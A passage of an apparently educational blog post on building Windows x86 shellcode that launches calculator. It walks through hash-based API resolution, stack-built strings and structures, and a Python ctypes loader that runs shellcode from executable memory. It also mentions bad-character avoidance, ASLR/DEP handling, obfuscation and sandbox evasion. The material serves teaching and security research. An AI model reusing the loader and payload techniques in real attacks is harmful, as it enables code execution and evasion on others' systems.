Convert to actual address\nmov   [esp+0x1c], eax           # Store in EAX position (for POPAD)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWhen a hash match is found, we:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eGet the function's ordinal from the ordinals table\u003c/li\u003e\n\u003cli\u003eUse the ordinal to index into the address table\u003c/li\u003e\n\u003cli\u003eExtract the function's relative virtual address (RVA)\u003c/li\u003e\n\u003cli\u003eConvert the RVA to an actual virtual address by adding the module base\u003c/li\u003e\n\u003cli\u003eStore the result where it will end up in EAX after POPAD\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eThis translation between name, ordinal, and address follows the PE export table structure, allowing us to resolve any exported function.\u003c/p\u003e\n\u003ch3\u003eResolving Required Function Addresses\u003c/h3\u003e\n\u003cp\u003eWith our function resolution mechanism in place, we can find the addresses of the specific functions we need:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-assembly\"\u003eresolve_symbols_kernel32:\npush  0x78b5b983                # TerminateProcess hash\ncall dword ptr [ebp+0x04]       # Call find_function\nmov   [ebp+0x10], eax           # Store TerminateProcess address\npush  0x16b3fe72                # CreateProcessA hash\ncall dword ptr [ebp+0x04]       # Call find_function\nmov   [ebp+0x18], eax           # Store CreateProcessA address\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eHere we resolve two essential functions:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003eTerminateProcess\u003c/strong\u003e (hash: 0x78b5b983) - Used for clean shellcode exit\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCreateProcessA\u003c/strong\u003e (hash: 0x16b3fe72) - Used to launch the calculator\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eThese specific hash values were pre-calculated using the same algorithm implemented in our shellcode. The resolved addresses are stored at fixed offsets from our EBP register for later use.\u003c/p\u003e\n\u003ch2\u003eCrafting Dynamic Data Structures\u003c/h2\u003e\n\u003ch3\u003eCreating the Program Name on the Stack\u003c/h3\u003e\n\u003cp\u003eTo launch calculator, we need its command line. We create this string directly on the stack:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-assembly\"\u003elaunch_calc:\nxor   eax, eax                  # Clear EAX register\npush  eax                       # Push null terminator (0x00000000)\npush  0x6578652e                # Push \".exe\" (reversed)\npush  0x636c6163                # Push \"calc\" (reversed)\nmov   ebx, esp                  # EBX points to \"calc.exe\"\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis technique builds a null-terminated string by pushing its components backwards onto the stack. Due to x86's little-endian byte ordering, we must reverse the string segments:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\"calc\" becomes 0x636c6163 (hex representation of ASCII values in reverse)\u003c/li\u003e\n\u003cli\u003e\".exe\" becomes 0x6578652e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eAfter pushing these values and a null terminator, ESP points to the start of our \"calc.exe\" string, which we save in EBX.\u003c/p\u003e\n\u003ch3\u003eCreating the STARTUPINFO Structure\u003c/h3\u003e\n\u003cp\u003eWindows CreateProcess API requires a STARTUPINFO structure. We create this directly on the stack:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-assembly\"\u003ecreate_startupinfoa:\nxor   eax, eax                  # Clear EAX\n# Push 16 zero values for various fields\n# [multiple pushes omitted for brevity]\nmov   al, 0x44                  # Set cb = 68 (size of STARTUPINFO)\npush  eax                       # Push structure size\nmov   esi, esp                  # ESI points to STARTUPINFO\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe STARTUPINFO structure has 17 fields, most of which we set to zero for default behavior. The critical field is \u003ccode\u003ecb\u003c/code\u003e (the first field), which must be set to the structure's size (68 bytes).\u003c/p\u003e\n\u003cp\u003eBy pushing all values onto the stack, we avoid the need for a static data section, keeping our shellcode position-independent and more versatile.\u003c/p\u003e\n\u003ch2\u003eExecuting the Payload: Process Creation\u003c/h2\u003e\n\u003ch3\u003ePreparing CreateProcessA Parameters\u003c/h3\u003e\n\u003cp\u003eWith our string and structure ready, we prepare to call CreateProcessA:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-assembly\"\u003ecall_createprocessa:\nmov   eax, esp                  # Get current stack pointer\nxor   ecx, ecx                  # Clear ECX\nmov   cx, 0x390                 # Set to 912 bytes\nsub   eax, ecx                  # Calculate space for PROCESS_INFORMATION\npush  eax                       # lpProcessInformation\npush  esi                       # lpStartupInfo\nxor   eax, eax                  # Clear EAX\npush  eax                       # lpCurrentDirectory = NULL\npush  eax                       # lpEnvironment = NULL\npush  eax                       # dwCreationFlags = 0\ninc   eax                       # EAX = 1\npush  eax                       # bInheritHandles = TRUE\ndec   eax                       # EAX = 0\npush  eax                       # lpThreadAttributes = NULL\npush  eax                       # lpProcessAttributes = NULL\npush  ebx                       # lpCommandLine = \"calc.exe\"\npush  eax                       # lpApplicationName = NULL\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis segment prepares the stack with the 10 parameters required by CreateProcessA:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eFirst, we reserve space for the PROCESS_INFORMATION output structure (not by adjusting ESP, but by calculating an address below our current stack)\u003c/li\u003e\n\u003cli\u003eThen we push parameters in reverse order (standard x86 calling convention)\u003c/li\u003e\n\u003cli\u003eWe use some register tricks (like INC/DEC) to avoid NULL bytes while still creating the values 0 and 1\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eThe care taken to avoid NULL bytes is a reminder that shellcode is often used in exploit contexts where string operations might terminate on NULL values.\u003c/p\u003e\n\u003ch3\u003eCalling the API and Exiting\u003c/h3\u003e\n\u003cp\u003eFinally, we call CreateProcessA and then terminate our own process:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-assembly\"\u003ecall  dword ptr [ebp+0x18]      # Call CreateProcessA\n\nexit_properly:\nxor   ecx, ecx                  # Clear ECX\npush  ecx                       # uExitCode = 0\npush  0xffffffff                # hProcess = -1 (current process)\ncall  dword ptr [ebp+0x10]      # Call TerminateProcess\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe CreateProcessA call launches calculator using our prepared parameters. Then we call TerminateProcess with:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eA process handle of 0xFFFFFFFF (-1), which is a special value referring to the current process\u003c/li\u003e\n\u003cli\u003eAn exit code of 0, indicating successful execution\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2\u003eShellcode Execution Environment\u003c/h2\u003e\n\u003cp\u003eThe Python wrapper around our shellcode performs several key functions:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-python\"\u003e# Allocate executable memory\nptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),\n                                          ctypes.c_int(len(shellcode)),\n                                          ctypes.c_int(0x3000),\n                                          ctypes.c_int(0x40))\n\n# Copy shellcode to allocated memory\nbuf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)\nctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),\n                                     buf,\n                                     ctypes.c_int(len(shellcode)))\n\n# Execute shellcode in a new thread\nht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),\n                                         ctypes.c_int(0),\n                                         ctypes.c_int(ptr),\n                                         ctypes.c_int(0),\n                                         ctypes.c_int(0),\n                                         ctypes.pointer(ctypes.c_int(0)))\n\n# Wait for thread completion\nctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))\n\u003c/code\u003e\u003c/pre\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eMemory Allocation\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eVirtualAlloc creates a memory block with PAGE_EXECUTE_READWRITE permissions (0x40)\u003c/li\u003e\n\u003cli\u003eThe allocation type (0x3000) combines MEM_COMMIT and MEM_RESERVE flags\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eShellcode Transfer\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRtlMoveMemory copies our shellcode bytes to the allocated memory\u003c/li\u003e\n\u003cli\u003eThis is essentially a memcpy operation\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eExecution\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eCreateThread creates a new thread with our shellcode as the entry point\u003c/li\u003e\n\u003cli\u003eWaitForSingleObject blocks until the shellcode thread completes execution\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eThis execution model represents a simplified version of how shellcode might be deployed in a real exploit scenario, though actual exploits would inject the shellcode into a vulnerable process rather than running it directly.\u003c/p\u003e\n\u003ch2\u003eAdvanced Techniques and Variations\u003c/h2\u003e\n\u003ch3\u003eAvoiding Bad Characters\u003c/h3\u003e\n\u003cp\u003eOur shellcode carefully avoids NULL bytes (0x00), which would terminate string operations in many exploit scenarios. This is achieved through techniques like:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eUsing \u003ccode\u003exor reg, reg\u003c/code\u003e instead of \u003ccode\u003emov reg, 0\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eUsing two's complement values (like 0xFFFFF9F0 instead of -1600)\u003c/li\u003e\n\u003cli\u003eUsing \u003ccode\u003einc\u003c/code\u003e/\u003ccode\u003edec\u003c/code\u003e instead of direct moves for small values\u003c/li\u003e\n\u003cli\u003eConstructing values indirectly\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eFor different exploit contexts, other characters might also need to be avoided, requiring additional shellcode engineering.\u003c/p\u003e\n\u003ch3\u003eHandling ASLR and DEP Protections\u003c/h3\u003e\n\u003cp\u003eModern Windows systems implement Address Space Layout Randomization (ASLR) and Data Execution Prevention (DEP). Our shellcode addresses these:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eASLR\u003c/strong\u003e: By dynamically finding module addresses through PEB traversal rather than hardcoding\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDEP\u003c/strong\u003e: Our execution wrapper explicitly allocates memory with execute permissions\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eIn real exploit scenarios, additional techniques like Return-Oriented Programming (ROP) might be needed to bypass these protections.\u003c/p\u003e\n\u003ch3\u003eAlternative Function Resolution Methods\u003c/h3\u003e\n\u003cp\u003eWhile our shellcode uses function hashing, other approaches include:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003eHardcoded offsets\u003c/strong\u003e: For specific Windows versions (less portable)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eImport table parsing\u003c/strong\u003e: Finding functions by walking the Import Address Table\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eForward searching\u003c/strong\u003e: Scanning memory for function prologues\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAPI hooking\u003c/strong\u003e: Replacing existing API calls to intercept execution\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eEach method has trade-offs in terms of size, complexity, and reliability across different system versions.\u003c/p\u003e\n\u003ch2\u003ePractical Applications and Learning Extensions\u003c/h2\u003e\n\u003ch3\u003eSecurity Research Applications\u003c/h3\u003e\n\u003cp\u003eUnderstanding shellcode construction is invaluable for:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003eExploit Development\u003c/strong\u003e: Creating custom payloads for penetration testing\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Research\u003c/strong\u003e: Understanding the impact of memory corruption bugs\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMalware Analysis\u003c/strong\u003e: Recognizing shellcode patterns in malicious software\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eIntrusion Detection\u003c/strong\u003e: Developing signatures for common shellcode techniques\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003eStudy Extensions\u003c/h3\u003e\n\u003cp\u003eTo build on this knowledge, consider exploring:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003eDifferent Architectures\u003c/strong\u003e: Adapting techniques for x64, ARM, or MIPS\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAlternative Payloads\u003c/strong\u003e: Creating shellcode for different actions (file operations, networking, etc.)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eObfuscation Techniques\u003c/strong\u003e: Implementing encryption or metamorphic code to evade detection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eSandbox Evasion\u003c/strong\u003e: Adding environmental checks to avoid analysis environments\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCross-Platform Shellcode\u003c/strong\u003e: Creating payloads that work across different operating systems\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003eConclusion\u003c/h2\u003e\n\u003cp\u003eOur calculator-launching shellcode demonstrates fundamental techniques critical to understanding low-level software security:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003ePosition-Independent Code\u003c/strong\u003e: Operating without assumptions about memory location\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eWindows Internal Navigation\u003c/strong\u003e: Finding key structures without API assistance\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDynamic Function Resolution\u003c/strong\u003e: Locating API functions using hashing techniques\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eStack-Based Structure Creation\u003c/strong\u003e: Building complex data structures dynamically\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eClean Execution Flow\u003c/strong\u003e: Properly initializing, executing, and terminating processes\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eThese techniques transcend the simple example presented here, forming the foundation for both offensive security research and defensive analysis. Whether you're studying malware, developing exploits for legitimate security testing, or simply seeking a deeper understanding of how software interacts with operating systems, shellcode analysis provides unique insights unavailable through higher-level programming approaches.\u003c/p\u003e\n\u003cp\u003eBy mastering these concepts, you gain not just technical skills but also a deeper appreciation for the intricate dance between code, memory, and the operating system that underpins all computer security.\u003c/p\u003e\n\u003chr\u003e\n\u003cp\u003e\u003cem\u003eDisclaimer: This article is provided for educational purposes only. The techniques described should only be used in authorized environments and security research contexts. Always follow responsible disclosure practices and operate within legal and ethical boundaries.\u003c/em\u003e\u003c/p\u003e\n","excerpt":"# Mastering x86 Shellcode: A Deep Dive into Calculator-Launching Payload Development\n\n## Introduction\n\nIn the realm of cybersecurity, shellcode represents one...","title":"Mastering x86 Shellcode: A Deep Dive into Calculator-Launching Payload Development","date":"2024-03-18","tags":["Shellcode","Assembly","Windows","Exploit Development"]}},"__N_SSG":true},"page":"/blog/[slug]","query":{"slug":"calculator-shellcode-analysis"},"buildId":"NHp1Ee1nfm3YUz_wer8uQ","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>